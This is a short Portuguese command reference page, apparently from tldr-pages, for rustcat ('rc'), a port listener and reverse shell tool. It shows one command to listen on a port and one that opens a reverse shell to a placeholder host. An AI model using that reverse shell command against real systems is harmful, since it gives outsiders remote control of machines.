<h1>rc</h1>

<blockquote><p>Um ouvinte de porta moderno e simplista e shell reverso.
Similar a <code>nc</code>.
Mais informações: <a href="https://github.com/robiot/rustcat/wiki/Basic-Usage">https://github.com/robiot/rustcat/wiki/Basic-Usage</a>.</p></blockquote>

<ul>
<li>Começa a escutar em uma porta específica:</li>
</ul>


<p><code>rc -lp {{porta}}</code></p>

<ul>
<li>Começa um shell reverso:</li>
</ul>


<p><code>rc {{host}} {{porta}} -r {{shell}}</code></p>
